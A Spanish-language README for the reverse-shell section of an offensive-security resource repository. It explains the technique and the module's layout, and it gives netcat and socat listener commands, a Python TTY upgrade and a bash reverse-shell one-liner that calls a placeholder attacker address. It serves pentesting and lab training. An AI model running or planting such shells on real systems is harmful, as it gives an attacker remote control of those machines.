# Reverse Shell Resources

## Descripción

Esta sección del repositorio contiene **recursos y ejemplos de reverse shells** organizados por sistema operativo, lenguaje y tipo de uso.

Un **reverse shell** es una técnica utilizada para establecer una conexión desde una máquina objetivo hacia una máquina atacante, permitiendo ejecutar comandos de forma remota.

A diferencia de un **bind shell**, en un reverse shell el sistema comprometido inicia la conexión hacia el atacante, lo que permite evadir ciertas restricciones de firewall o NAT.

Este módulo del repositorio está diseñado como **referencia educativa y práctica** para:

* pentesting
* laboratorios de ciberseguridad
* CTF
* investigación en seguridad ofensiva

---

# Estructura del módulo

Los reverse shells están organizados por **entorno objetivo y lenguaje**, facilitando su consulta rápida durante pruebas de seguridad.

```text
cibersecurity-reverse_shell/
├── common
│   ├── listeners
│   └── tty-upgrade
├── linux
│   ├── bash
│   ├── nc
│   ├── python
│   └── socat
├── web
│   └── php
└── windows
    └── powershell
```

---

# Categorías

## Linux

Contiene reverse shells diseñados para entornos **Linux / Unix**.

Lenguajes incluidos:

* bash
* netcat (nc)
* python
* socat

Estas variantes suelen utilizarse en:

* explotación de servicios
* shells limitadas
* post-explotación en Linux

---

## Windows

Contiene reverse shells orientados a **sistemas Windows**.

Lenguajes incluidos:

* PowerShell

Estas variantes suelen utilizarse en:

* explotación remota
* movimiento lateral
* post-explotación

---

## Web

Incluye shells utilizadas en **entornos web comprometidos**.

Lenguajes incluidos:

* PHP

Estas shells suelen utilizarse después de:

* file upload vulnerabilities
* RCE en aplicaciones web
* explotación de CMS

---

## Common

Contiene utilidades que funcionan en múltiples entornos.

### Listeners

Ejemplos de comandos para recibir conexiones reverse shell.

Ejemplo con netcat:

```bash
nc -lvnp 4444
```

Ejemplo con socat:

```bash
socat TCP-LISTEN:4444,fork -
```

---

### TTY Upgrade

Técnicas para mejorar una shell limitada a una shell interactiva.

Ejemplo con Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Esto permite:

* autocompletado
* control de terminal
* uso de herramientas interactivas

---

# Flujo típico de uso

Un escenario común de explotación sería:

1. obtener ejecución remota en el sistema objetivo
2. ejecutar un reverse shell
3. recibir la conexión en la máquina atacante
4. mejorar la shell interactiva

Ejemplo simplificado:

```bash
Attacker:
nc -lvnp 4444
```

```bash
Target:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

# Casos de uso

Los reverse shells son utilizados en:

* pentesting
* red teaming
* auditorías de seguridad
* CTF
* laboratorios de seguridad

---

# Ventajas

* permiten acceso remoto al sistema comprometido
* pueden evadir ciertos firewalls
* funcionan en múltiples lenguajes y entornos
* facilitan la post-explotación

---

# Limitaciones

* algunos sistemas bloquean conexiones salientes
* antivirus y EDR pueden detectar payloads conocidos
* algunas shells no son completamente interactivas

Por esta razón es común utilizar técnicas de **TTY upgrade**.

---

# Advertencia

Los ejemplos incluidos en esta sección deben utilizarse únicamente en:

* laboratorios
* entornos controlados
* auditorías autorizadas

El uso no autorizado contra sistemas externos puede ser ilegal.

---

# Referencias

Algunas referencias útiles sobre reverse shells:

* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* https://book.hacktricks.xyz
* https://github.com/swisskyrepo/PayloadsAllTheThings

---

# Licencia

Este contenido se proporciona con fines educativos dentro del repositorio **cibersecurity-resources**.
